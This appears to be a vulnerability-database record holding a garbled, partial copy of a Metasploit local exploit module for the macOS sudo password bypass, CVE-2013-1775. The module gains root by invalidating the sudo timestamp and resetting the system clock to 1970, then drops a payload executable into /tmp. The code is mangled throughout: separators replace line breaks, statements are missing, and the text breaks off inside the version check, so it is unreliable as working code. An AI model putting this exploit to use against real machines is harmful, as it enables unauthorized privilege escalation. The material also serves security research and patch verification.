{
    "text": "vul_name : Mac OS X 10.8.4 Sudo Password Bypass Vulnerability ， vul_cve : CVE-2013-1775 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'shellwords' ， class Metasploit3 < Msf : Exploit : Local ，  # ManualRanking because it's going to modify system time ，  # Even when it will try to restore things , user should use ，  # it at his own risk ， Rank = NormalRanking ， include Msf : Post : Common ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， SYSTEMSETUP_PATH = \"/usr/sbin/systemsetup\" ， SUDOER_GROUP = \"admin\" ， VULNERABLE_VERSION_RANGES = [ '1.6.0' , '1.7.10p6' ]  ,  [ '1.8.0' , '1.8.6p6' ]  ，  # saved clock config ， attr_accessor : time ,  : date ,  : networked ,  : zone ,  : network_server ， super ( update_info ( info ,  ， 'Name' => 'Mac OS X Sudo Password Bypass' ,  ， 'Description' => %q{ ， This module gains a session with root permissions on versions of OS X with ， sudo binary vulnerable to CVE-2013-1775. Tested working on Mac OS 10.7-10.8.4 ,  ， and possibly lower versions. ， If your session belongs to a user with Administrative Privileges ，  ( the user is in the sudoers file and is in the \"admin group\" )  , and the ， user has ever run the \"sudo\" command , it is possible to become the super ， user by running `sudo -k` and then resetting the system clock to 01-01-1970. ， This module will fail silently if the user is not an admin or if the user has never ， run the sudo command. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Todd C. Miller' ,  # Vulnerability discovery ， 'joev <jvennix [ at ] rapid7.com>' ,  # Metasploit module ， 'juan vazquez' # testing/fixing module bugs ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-1775' ]  ,  ，  [ 'OSVDB' , '90677' ]  ,  ，  [ 'BID' , '58203' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'osx' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X86_64 , ARCH_CMD ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [  ，  [ 'Mac OS X x86 ( Native Payload ) ' ,  ， { ， 'Platform' => 'osx' ,  ， 'Arch' => ARCH_X86 ， } ，  ]  ,  ，  [ 'Mac OS X x64 ( Native Payload ) ' ,  ， { ， 'Platform' => 'osx' ,  ， 'Arch' => ARCH_X86_64 ， } ，  ]  ,  ，  [ 'CMD' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Feb 28 2013' ， register_advanced_options (  [  ， OptString.new ( 'TMP_FILE' ,  ，  [ true , 'For the native targets , specifies the path that '+ ， 'the executable will be dropped on the client machine.' ,  ， '/tmp/.<random>/<random>' ]  ，  ]  , self.class )  ， end ，  # ensure target is vulnerable by checking sudo vn and checking ，  # user is in admin group. ， def check ， sudo_vn = $ 1 ， sudo_vn_parts = sudo_vn.split ( / [ \\.p ] / ) .map ( & : to_i )  ，  # check vn between 1.6.0 through 1.7.10p6 ，  # and 1.8.0 through 1.8.6p6 ， print_error \"sudo version # {sudo_vn} not vulnerable.\"",
    "time": "2013.08.27"
}